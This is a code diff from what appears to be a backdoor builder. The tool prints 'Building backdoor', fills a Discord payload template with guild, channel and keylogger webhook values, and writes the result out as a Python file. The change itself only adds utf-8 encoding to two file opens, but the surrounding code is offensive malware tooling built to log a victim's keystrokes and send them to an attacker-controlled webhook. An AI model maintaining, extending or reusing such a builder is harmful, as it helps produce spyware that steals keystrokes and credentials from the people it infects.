@@ -249,7 +249,7 @@ try:
             if input == "y":
                 print("[+] Building backdoor...")
                 if payload == "discord":
-                    f = open("code/discord/main.py", 'r')
+                    f = open("code/discord/main.py", 'r', encoding='utf-8')
                     file = f.read()
                     f.close()
                     newfile = file.replace("{GUILD}", str(settings[1]))
@@ -257,7 +257,7 @@ try:
                     newfile = newfile.replace("{CHANNEL}", str(settings[3]))
                     newfile = newfile.replace("{KEYLOG_WEBHOOK}", str(settings[4]))
 
-                f = open(settings[0] + ".py", 'w')
+                f = open(settings[0] + ".py", 'w', encoding='utf-8')
                 f.write(newfile)
                 f.close()
 
